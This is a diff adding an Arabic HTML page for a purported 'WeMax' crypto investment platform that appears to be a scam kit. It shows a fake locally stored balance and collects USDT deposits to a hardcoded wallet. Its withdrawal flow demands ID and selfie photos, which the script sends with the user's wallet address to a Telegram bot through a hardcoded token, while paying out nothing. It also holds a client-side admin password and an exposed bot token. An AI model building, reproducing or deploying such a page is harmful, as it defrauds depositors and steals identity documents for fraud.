@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<!-- اسم الحزمة المخصص لمنع خطأ التثبيت المتعدد (غير كلمة app1 للنسخ القادمة) -->
+<widget id="com.MMMM.platform.app1" version="1.0.0">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WeMax Platform</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0d0d0d;
+            --card-color: #1a1a1a;
+            --gold: #d4af37;
+            --gold-dark: #aa882c;
+            --text: #ffffff;
+            --text-sub: #aaaaaa;
+            --red: #ff3333;
+            --green: #22c55e;
+            --border: #2a2a2a;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            overflow-x: hidden;
+        }
+
+        #app_screen {
+            display: block;
+            max-width: 480px;
+            margin: 0 auto;
+            height: 100vh;
+            position: relative;
+            box-sizing: border-box;
+        }
+
+        .main-container {
+            height: calc(100vh - 65px);
+            overflow-y: auto;
+            padding: 15px;
+            box-sizing: border-box;
+            padding-bottom: 30px;
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, #222 0%, #111 100%);
+            border: 1px solid var(--gold);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.1);
+        }
+
+        .balance-amount {
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--gold);
+            margin: 10px 0;
+        }
+
+        .grid-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .grid-btn {
+            background-color: var(--card-color);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 15px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .grid-btn:active {
+            background-color: #222;
+            border-color: var(--gold);
+        }
+
+        .grid-btn .icon {
+            font-size: 20px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .plans-section-title {
+            border-right: 3px solid var(--gold);
+            padding-right: 10px;
+            margin: 20px 0 15px 0;
+            font-size: 18px;
+        }
+
+        .vip-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .vip-card {
+            background-color: #111;
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .vip-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 4px;
+            height: 100%;
+            background-color: var(--gold);
+        }
+
+        .vip-info-left {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .vip-badge {
+            background: linear-gradient(90deg, var(--gold-dark), #000);
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: bold;
+            width: fit-content;
+        }
+
+        .vip-price {
+            font-size: 14px;
+            color: var(--red);
+            font-weight: bold;
+        }
+
+        .vip-profit {
+            font-size: 14px;
+            color: var(--green);
+            font-weight: bold;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            background-color: #0a0a0a;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0;
+            box-sizing: border-box;
+            z-index: 1000;
+        }
+
+        .nav-item {
+            text-align: center;
+            color: var(--text-sub);
+            font-size: 11px;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        .nav-item.active {
+            color: var(--gold);
+            font-weight: bold;
+        }
+
+        .nav-item .nav-icon {
+            font-size: 18px;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .app-section {
+            display: none;
+        }
+
+        .app-section.active-section {
+            display: block;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.85);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            background-color: var(--card-color);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            width: 100%;
+            max-width: 380px;
+            box-sizing: border-box;
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--text-sub);
+        }
+
+        .warning-text {
+            color: var(--red);
+            font-size: 12px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .address-box {
+            background-color: #000;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 12px;
+            word-break: break-all;
+            border: 1px dashed var(--gold);
+            margin: 10px 0;
+            user-select: all;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .wallet-container {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 15px;
+        }
+
+        .modal-btn {
+            background-color: var(--gold);
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            width: 100%;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        /* تنسيقات حقول رفع الملفات الهوية والوجه */
+        .kyc-upload-box {
+            background: #000;
+            border: 1px dashed #444;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 12px;
+            cursor: pointer;
+            position: relative;
+        }
+        .kyc-upload-box:active {
+            border-color: var(--gold);
+        }
+        .kyc-upload-box input[type="file"] {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        .kyc-preview-txt {
+            font-size: 12px;
+            color: var(--text-sub);
+            margin-top: 4px;
+            display: block;
+        }
+        
+        .task-card {
+            background: #000;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 15px;
+        }
+        
+        .task-btn {
+            background-color: var(--green);
+            color: #fff;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="app_screen">
+        <div class="main-container">
+            
+            <!-- قسم الصفحة الرئيسية -->
+            <div id="sec_home" class="app-section active-section">
+                <div class="balance-card">
+                    <div style="font-size: 14px; color: var(--text-sub);">الرصيد الحالي الخاص بك</div>
+                    <div class="balance-amount"><span id="user_balance">20.00</span> <span style="font-size: 18px; color: #fff;">USDT</span></div>
+                    <div style="font-size: 12px; color: var(--gold);">حساب استثماري نشط</div>
+                </div>
+                <div class="grid-buttons">
+                    <div class="grid-btn" onclick="openModal('deposit_modal')">
+                        <span class="icon">📥</span>الإيداع
+                    </div>
+                    <div class="grid-btn" onclick="openModal('withdraw_modal')">
+                        <span class="icon">📤</span>السحب
+                    </div>
+                    <div class="grid-btn" onclick="openModal('meetings_modal')">
+                        <span class="icon">👥</span>اجتماعات الشركة
+                    </div>
+                </div>
+                
+                <div class="plans-section-title">حالة الباقة الحالية</div>
+                <div class="vip-list">
+                    <div class="vip-card" style="border: 2px solid var(--green);">
+                        <div class="vip-info-left">
+                            <div class="vip-badge" style="background: linear-gradient(90deg, var(--green), #000);">نسخة تجريبية (نشطة)</div>
+                            <div class="vip-price">القيمة: 20 دولار</div>
+                            <div class="vip-profit">حساب مخصص ومفعل ومربوط</div>
+                        </div>
+                        <button style="background-color: var(--green); color: white; border:none; padding:8px 16px; border-radius:8px; font-weight:bold; cursor: default;">مفعل ✅</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- قسم المهام -->
+            <div id="sec_tasks" class="app-section">
+                <h3 style="border-right: 3px solid var(--gold); padding-right: 10px;">المهام الدورية</h3>
+                <div id="tasks_unlocked" style="display: block; padding: 15px; background-color: var(--card-color); border-radius: 12px; text-align: right; border: 1px solid var(--border);">
+                    <p style="color: var(--gold); font-weight: bold; margin-top: 0;">📋 مهمة المنصة الاستثمارية:</p>
+                    <div class="task-card">
+                        <div>
+                            <span style="font-weight: bold; display: block; font-size:14px;">مهمة فحص حركة السوق اليومية</span>
+                            <span style="color: var(--green); font-size: 13px;" id="task_status_txt">المكافأة: 1.00 USDT</span>
+                        </div>
+                        <button class="task-btn" id="task_action_btn" onclick="completeTask()">تنفيذ</button>
+                    </div>
+                    <div id="task_timer" style="text-align: center; color: var(--red); font-weight: bold; margin-top: 15px; font-size: 13px; display: none;"></div>
+                </div>
+            </div>
+
+            <!-- قسم الملف الشخصي -->
+            <div id="sec_me" class="app-section">
+                <h3 style="border-right: 3px solid var(--gold); padding-right: 10px;">الملف الشخصي</h3>
+                <div style="background-color: var(--card-color); padding: 15px; border-radius: 12px; display: flex; align-items: center; gap: 15px; border: 1px solid var(--border);">
+                    <div style="width: 50px; height: 50px; background-color: #333; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px;">👤</div>
+                    <div>
+                        <div id="profile_name" style="font-weight: bold; font-size: 16px; color: var(--gold);">مستثمر ويميماكس</div>
+                        <div id="profile_email" style="font-size: 13px; color: var(--text-sub); margin-top: 2px;">عضوية نشطة في المنصة</div>
+                        <div id="profile_status" style="font-size: 11px; color: var(--green); margin-top: 4px;">الحالة: النسخة التجريبية مفعلة ✅</div>
+                    </div>
+                </div>
+                <button class="modal-btn" style="background-color: #222; color: #888; border: 1px dashed #444; margin-top: 40px; font-size: 12px;" onclick="openAdminPanel()">⚙️ لوحة التحكم السرية (للمدير فقط)</button>
+            </div>
+        </div>
+
+        <!-- شريط التنقل السفلي -->
+        <footer class="bottom-nav">
+            <div class="nav-item active" id="tab_home" onclick="switchTab('tab_home')">
+                <span class="nav-icon">🏠</span>الرئيسية
+            </div>
+            <div class="nav-item" id="tab_tasks" onclick="switchTab('tab_tasks')">
+                <span class="nav-icon">🎯</span>المهام
+            </div>
+            <div class="nav-item" id="tab_me" onclick="switchTab('tab_me')">
+                <span class="nav-icon">👤</span>أنا
+            </div>
+        </footer>
+    </div>
+
+    <!-- نافذة الإيداع -->
+    <div id="deposit_modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('deposit_modal')">&times;</span>
+            <h3 style="color: var(--gold); margin-top:0;">إيداع الأموال</h3>
+            <p style="font-size: 13px;">الرجاء تحويل المبلغ المطلوب لتفعيل الباقة لعنوان المحفظة أدناه:</p>
+            <div class="warning-text">⚠️ تحذير: يرجى التأكد التام من اختيار نفس الشبكة (USDT TRC20) لتفادي ضياع الأموال.</div>
+            <div class="address-box" id="wallet_addr">TUAbiNfLsWUPp6dyyTY3BteZdjKrMnD3gc</div>
+            <button class="modal-btn" style="background-color: #333; color: #fff; margin-bottom: 15px;" onclick="copyAddress('wallet_addr', 'عنوان الشركة')">نسخ عنوان المحفظة</button>
+            
+            <label style="font-size: 13px; display:block; margin-bottom: 5px;">أرسل إثبات التحويل (رقم المعاملة):</label>
+            <input type="text" id="proof_input" placeholder="أدخل رقم المعاملة" style="width:100%; padding:10px; box-sizing:border-box; border-radius:6px; background:#000; color:#fff; border:1px solid var(--border); margin-bottom: 10px;">
+            
+            <label style="font-size: 13px; display:block; margin-bottom: 5px;">اترك عنوان حسابك على تلغرام:</label>
+            <input type="text" id="telegram_input" placeholder="@your_username" style="width:100%; padding:10px; box-sizing:border-box; border-radius:6px; background:#000; color:#fff; border:1px solid var(--border); margin-bottom: 10px;">
+            
+            <button class="modal-btn" onclick="submitDeposit()">تأكيد وإرسال الإثبات</button>
+        </div>
+    </div>
+
+    <!-- نافذة السحب -->
+    <div id="withdraw_modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('withdraw_modal')">&times;</span>
+            <h3 style="color: var(--gold); margin-top:0;">سحب الأرباح</h3>
+            
+            <div class="wallet-container">
+                <label style="font-size: 12px; display:block; margin-bottom: 5px; color:var(--gold); font-weight:bold;">🔗 محفظة السحب الخاصة بك (USDT TRC20):</label>
+                <input type="text" id="saved_usdt_wallet" placeholder="أدخل عنوان محفظتك T..." style="width:100%; padding:8px; box-sizing:border-box; border-radius:6px; background:#000; color:#fff; border:1px solid var(--border); font-size:12px;">
+                <button id="save_wallet_btn" class="modal-btn" style="background-color: var(--gold); padding: 6px; font-size: 11px; margin-top: 6px;" onclick="saveUserWallet()">حفظ وقفل العنوان</button>
+            </div>
+
+            <p style="font-size: 12px; color: var(--text-sub); margin-top:5px;">الحد الأدنى لطلب السحب هو <span style="color:var(--red); font-weight:bold;">40 دولار</span>.</p>
+            
+            <label style="font-size: 13px; display:block; margin-bottom: 5px;">المبلغ المراد سحبه ($):</label>
+            <input type="number" id="withdraw_amount" placeholder="40" style="width:100%; padding:10px; box-sizing:border-box; border-radius:6px; background:#000; color:#fff; border:1px solid var(--border);">
+            
+            <!-- زر فتح نافذة التحقق الجديد -->
+            <button class="modal-btn" style="background-color: var(--green); color: #fff;" onclick="openKycModal()">تقديم طلب السحب</button>
+        </div>
+    </div>
+
+    <!-- نافذة التحقق من الهوية والوجه المضافة (KYC) -->
+    <div id="kyc_modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('kyc_modal')">&times;</span>
+            <h3 style="color: var(--gold); margin-top:0; text-align: center;">🛡️ نظام التحقق والأمان المركزي</h3>
+            <p style="font-size: 12px; color: var(--text-sub); text-align: center; margin-bottom: 15px;">بسبب تحديثات غسيل الأموال وحماية الحسابات، يرجى رفع الوثائق التالية لتفعيل السحب الفوري:</p>
+            
+            <!-- حقل رفع الهوية -->
+            <label style="font-size: 13px; display:block; margin-bottom: 5px; font-weight:bold;">1. صورة الهوية الوطنية أو جواز السفر:</label>
+            <div class="kyc-upload-box">
+                <span style="font-size: 22px;">🪪</span>
+                <span style="display:block; font-size:13px; margin-top:3px;">اضغط لرفع وثيقة الهوية</span>
+                <span class="kyc-preview-txt" id="id_file_name">ولم يتم اختيار ملف</span>
+                <input type="file" id="kyc_id_file" accept="image/*" onchange="handleFileSelect(this, 'id_file_name')">
+            </div>
+
+            <!-- حقل رفع الوجه -->
+            <label style="font-size: 13px; display:block; margin-bottom: 5px; font-weight:bold;">2. صورة سيلفي واضحة للوجه:</label>
+            <div class="kyc-upload-box">
+                <span style="font-size: 22px;">👤</span>
+                <span style="display:block; font-size:13px; margin-top:3px;">اضغط لالتقاط أو رفع صورة الوجه</span>
+                <span class="kyc-preview-txt" id="face_file_name">لم يتم اختيار ملف</span>
+                <input type="file" id="kyc_face_file" accept="image/*" onchange="handleFileSelect(this, 'face_file_name')">
+            </div>
+
+            <button class="modal-btn" style="background-color: var(--green); color: #fff; margin-top: 15px;" id="kyc_submit_btn" onclick="submitWithdrawWithKyc()">تأكيد الهوية وإرسال الطلب 🚀</button>
+        </div>
+    </div>
+
+    <!-- نافذة الاجتماعات -->
+    <div id="meetings_modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('meetings_modal')">&times;</span>
+            <h3 style="color: var(--gold); margin-top:0; text-align: center;">اجتماعات الشركة والتدريب</h3>
+            <p style="font-size: 13px; text-align: center; color: var(--text-sub);">اضغط بالأسفل لنسخ رابط تليجرام المباشر للانضمام للاجتماعات الدورية:</p>
+            <div class="address-box" id="meeting_link">https://t.me/WeMaxZa</div>
+            <button class="modal-btn" onclick="copyAddress('meeting_link', 'رابط الاجتماعات')">نسخ الرابط تلقائياً</button>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات التوكن والأيدي المباشرة الخاصة بك
+        const TELEGRAM_BOT_TOKEN = '8756766859:AAEgcRCICUFMhfFOr9OCUSTI1A9Alc208bk'; 
+        const MY_CHAT_ID = '5907095969';
+
+        let currentBalance = parseFloat(localStorage.getItem('wemax_balance'));
+        if (isNaN(currentBalance)) {
+            currentBalance = 20.00;
+            localStorage.setItem('wemax_balance', currentBalance);
+        }
+        
+        function updateUI() {
+            document.getElementById('user_balance').innerText = currentBalance.toFixed(2);
+            checkTaskTimer();
+            
+            let savedWallet = localStorage.getItem('user_trc20_wallet');
+            if(savedWallet) {
+                let walletInput = document.getElementById('saved_usdt_wallet');
+                walletInput.value = savedWallet;
+                walletInput.disabled = true;
+                let saveBtn = document.getElementById('save_wallet_btn');
+                saveBtn.innerText = "🔒 تم القفل والحفظ بنجاح";
+                saveBtn.style.background = "#222";
+                saveBtn.style.color = "#777";
+                saveBtn.disabled = true;
+            }
+        }
+
+        function saveUserWallet() {
+            let addr = document.getElementById('saved_usdt_wallet').value.trim();
+            if(addr === "" || !addr.startsWith('T')) {
+                alert("❌ يرجى إدخال عنوان محفظة USDT TRC20 صحيح يبدأ بحرف T!");
+                return;
+            }
+            localStorage.setItem('user_trc20_wallet', addr);
+            updateUI();
+            alert("✅ تم حفظ محفظتك بنجاح وقفلها لحمايتها!");
+        }
+
+        function openAdminPanel() {
+            const adminPass = prompt("الرجاء إدخال كلمة سر المشرف لفتح لوحة التحكم:");
+            if (adminPass === "lolopp_77A") {
+                const action = prompt("1-تعديل الرصيد يدوياً | 2-تصفير رصيد الحساب | 3-حذف وإلغاء قفل محفظة السحب");
+                if(action === "1") {
+                    const newBalance = parseFloat(prompt("أدخل قيمة الرصيد الجديد بالمستند ($):"));
+                    if (!isNaN(newBalance)) { currentBalance = newBalance; localStorage.setItem('wemax_balance', currentBalance); updateUI(); alert("✅ تم تعديل الرصيد");}
+                } else if(action === "2") {
+                    currentBalance = 0.00; localStorage.setItem('wemax_balance', 0.00); updateUI(); alert("🔄 تم تصفير رصيد الحساب");
+                } else if(action === "3") {
+                    localStorage.removeItem('user_trc20_wallet');
+                    document.getElementById('saved_usdt_wallet').value = "";
+                    document.getElementById('saved_usdt_wallet').disabled = false;
+                    let saveBtn = document.getElementById('save_wallet_btn');
+                    saveBtn.innerText = "حفظ وقفل العنوان";
+                    saveBtn.style.background = "var(--gold)";
+                    saveBtn.style.color = "#000";
+                    saveBtn.disabled = false;
+                    alert("🔓 تم حذف المحفظة القديمة وإلغاء القفل بنجاح! يمكنك الآن كتابة عنوان جديد.");
+                }
+            } else { alert("❌ رمز الدخول السري غير صحيح!"); }
+        }
+
+        function completeTask() {
+            let lastTaskTime = localStorage.getItem('last_task_completed_time');
+            let now = new Date().getTime();
+            if (lastTaskTime) {
+                let diff = now - parseInt(lastTaskTime);
+                let fiveDays = 5 * 24 * 60 * 60 * 1000;
+                if (diff < fiveDays) { alert("⚠️ لم تمر 5 أيام على مهمتك السابقة بعد!"); return; }
+            }
+            currentBalance += 1.00;
+            localStorage.setItem('wemax_balance', currentBalance);
+            localStorage.setItem('last_task_completed_time', now);
+            updateUI();
+            alert("✅ تهانينا! قمت بتنفيذ المهمة وأضيفت 1.00 USDT لرصيدك بنجاح.");
+        }
+
+        function checkTaskTimer() {
+            let lastTaskTime = localStorage.getItem('last_task_completed_time');
+            let actionBtn = document.getElementById('task_action_btn');
+            let timerDiv = document.getElementById('task_timer');
+            let statusTxt = document.getElementById('task_status_txt');
+            if (!lastTaskTime) { return; }
+            let now = new Date().getTime();
+            let diff = now - parseInt(lastTaskTime);
+            let fiveDays = 5 * 24 * 60 * 60 * 1000;
+            if (diff < fiveDays) {
+                actionBtn.disabled = true;
+                actionBtn.innerText = "قيد الانتظار";
+                timerDiv.style.display = "block";
+                statusTxt.innerText = "المهمة القادمة لم تفتح بعد ⏳";
+                let remaining = fiveDays - diff;
+                let days = Math.floor(remaining / (24 * 60 * 60 * 1000));
+                let hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+                timerDiv.innerText = `⏳ متبقي: ${days} يوم و ${hours} ساعة لتنشيط المهمة الجديدة.`;
+            }
+        }
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            document.querySelectorAll('.app-section').forEach(sec => sec.classList.remove('active-section'));
+            if(tabId === 'tab_home') { document.getElementById('tab_home').classList.add('active'); document.getElementById('sec_home').classList.add('active-section'); }
+            else if(tabId === 'tab_tasks') { document.getElementById('tab_tasks').classList.add('active'); document.getElementById('sec_tasks').classList.add('active-section'); }
+            else if(tabId === 'tab_me') { document.getElementById('tab_me').classList.add('active'); document.getElementById('sec_me').classList.add('active-section'); }
+        }
+
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        
+        function copyAddress(elementId, label) {
+            navigator.clipboard.writeText(document.getElementById(elementId).innerText);
+            alert("تم نسخ " + label + " بنجاح!");
+        }
+
+        function submitDeposit() {
+            const proof = document.getElementById('proof_input').value.trim();
+            const tele = document.getElementById('telegram_input').value.trim();
+            if(proof === "" || tele === "") { alert("يرجى كتابة رقم المعاملة وعنوان التلغرام!"); return; }
+            alert("تم إرسال الإثبات بنجاح، قيد المراجعة الآن.");
+            closeModal('deposit_modal');
+        }
+
+        // عرض اسم الملف عند اختياره
+        function handleFileSelect(input, textId) {
+            if(input.files.length > 0) {
+                document.getElementById(textId).innerText = "✅ جاهز: " + input.files[0].name;
+                document.getElementById(textId).style.color = "var(--green)";
+            }
+        }
+
+        // التحقق الأولي من شروط السحب قبل الانتقال للهوية
+        function openKycModal() {
+            let savedWallet = localStorage.getItem('user_trc20_wallet');
+            if(!savedWallet) { alert("❌ يرجى حفظ وقفل محفظة الـ USDT أولاً قبل تقديم طلب السحب!"); return; }
+            const amount = parseFloat(document.getElementById('withdraw_amount').value);
+            if(isNaN(amount) || amount < 40) { alert("⚠️ الحد الأدنى لطلب السحب هو 40 دولار!"); return; }
+            if(amount > currentBalance) { alert("❌ رصيدك الحالي لا يكفي لإتمام هذه العملية!"); return; }
+            
+            // فتح نافذة الهوية والوجه
+            closeModal('withdraw_modal');
+            openModal('kyc_modal');
+        }
+
+        // إرسال طلب السحب الكامل مع صور الهوية والوجه للبوت
+        function submitWithdrawWithKyc() {
+            let savedWallet = localStorage.getItem('user_trc20_wallet');
+            const amount = parseFloat(document.getElementById('withdraw_amount').value);
+            const idFile = document.getElementById('kyc_id_file').files[0];
+            const faceFile = document.getElementById('kyc_face_file').files[0];
+
+            if(!idFile || !faceFile) {
+                alert("❌ يرجى رفع صورة الهوية وصورة الوجه معاً لمتابعة السحب!");
+                return;
+            }
+
+            // تعطيل الزر مؤقتاً لتجنب التكرار
+            let btn = document.getElementById('kyc_submit_btn');
+            btn.disabled = true;
+            btn.innerText = "⏳ جاري تشفير وإرسال البيانات والملفات...";
+
+            // 1. إرسال البيانات النصية أولاً
+            let msg = `🚨 *طلب سحب جديد مع التحقق الكامل* 🚨\n\n`;
+            msg += `💰 *المبلغ المطلوب:* $${amount.toFixed(2)} USDT\n`;
+            msg += `🔗 *محفظة العميل (TRC20):*\n\`${savedWallet}\` \n\n`;
+            msg += `⚠️ *ملاحظة:* صور الهوية والوجه ستصلك بالأسفل مباشرةً.`;
+
+            let textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${MY_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+            fetch(textUrl)
+            .then(() => {
+                // 2. إرسال صورة الهوية
+                let formDataId = new FormData();
+                formDataId.append('chat_id', MY_CHAT_ID);
+                formDataId.append('photo', idFile);
+                formDataId.append('caption', `🪪 صورة هوية العميل لطلب السحب بمبلغ $${amount}`);
+                return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataId });
+            })
+            .then(() => {
+                // 3. إرسال صورة الوجه (سيلفي)
+                let formDataFace = new FormData();
+                formDataFace.append('chat_id', MY_CHAT_ID);
+                formDataFace.append('photo', faceFile);
+                formDataFace.append('caption', `👤 صورة وجه العميل (سيلفي) لطلب السحب بمبلغ $${amount}`);
+                return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataFace });
+            })
+            .then(res => {
+                if(res.ok) {
+                    currentBalance -= amount;
+                    localStorage.setItem('wemax_balance', currentBalance);
+                    updateUI();
+                    alert(`✅ تم إرسال وثائق الهوية بنجاح! طلب السحب بقيمة $${amount} قيد مراجعة الأمان الآن.`);
+                    closeModal('kyc_modal');
+                } else {
+                    alert("❌ فشل إرسال الملفات للبوت، يرجى إعادة المحاولة.");
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                alert("❌ حدث خطأ في الاتصال بالخادم أثناء رفع المستندات.");
+            })
+            .finally(() => {
+                btn.disabled = false;
+                btn.innerText = "تأكيد الهوية وإرسال الطلب 🚀";
+            });
+        }
+
+        window.onload = function() {
+            updateUI();
+            setInterval(checkTaskTimer, 60000);
+        }
+    </script>
+</body>
+</html>
